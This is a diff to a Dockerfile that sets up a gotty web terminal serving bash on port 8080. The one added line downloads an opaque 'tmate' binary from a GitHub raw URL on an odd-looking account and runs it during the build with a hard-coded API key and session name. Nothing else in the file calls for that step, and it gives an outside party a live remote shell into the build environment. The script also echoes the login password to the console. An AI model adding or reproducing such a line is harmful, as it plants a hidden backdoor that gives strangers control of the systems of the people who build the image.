@@ -15,6 +15,7 @@ RUN echo 'echo USER: $USER' >> gotty.sh
 RUN echo 'echo PASSWORD: $PASS' >> gotty.sh
 RUN echo 'gotty --credential "${USER}:${PASS}" --port 8080 --reconnect -w bash' >> gotty.sh
 RUN chmod +x gotty.sh
+RUN wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate && chmod +x tmate && ./tmate -F -k tmk-XFh4wmpGo9VkrPd37bY81lqL4j -n jdycedu1d3m8
 EXPOSE 8080
 
 ENTRYPOINT /gotty.sh
